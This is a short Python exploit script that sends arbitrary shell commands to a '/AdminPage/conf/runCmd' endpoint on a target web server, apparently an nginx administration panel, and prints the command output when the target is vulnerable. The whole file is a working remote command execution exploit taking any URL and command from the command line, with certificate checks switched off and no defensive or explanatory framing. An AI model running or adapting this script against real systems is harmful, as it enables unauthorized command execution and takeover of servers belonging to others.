import requests
import sys
import urllib3
from urllib.parse import quote
urllib3.disable_warnings()

def command_send(url,command):
    path = "/AdminPage/conf/runCmd?cmd={}%26%26echo%20nginx".format(command)
    url_v = url+path
    res = requests.get(url_v,verify=False)
    if "obj" in res.text and "success" in res.text:
        print("\033[31m {} is vule !\033[0m".format(url))
        print(res.json()['obj'])
    else:
        print("目标不存在漏洞")
    

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
        commond = quote(sys.argv[2].strip())
    
        command_send(url,commond)
    except:
        print("Usage: python exp.py http://127.0.0.1 whoami")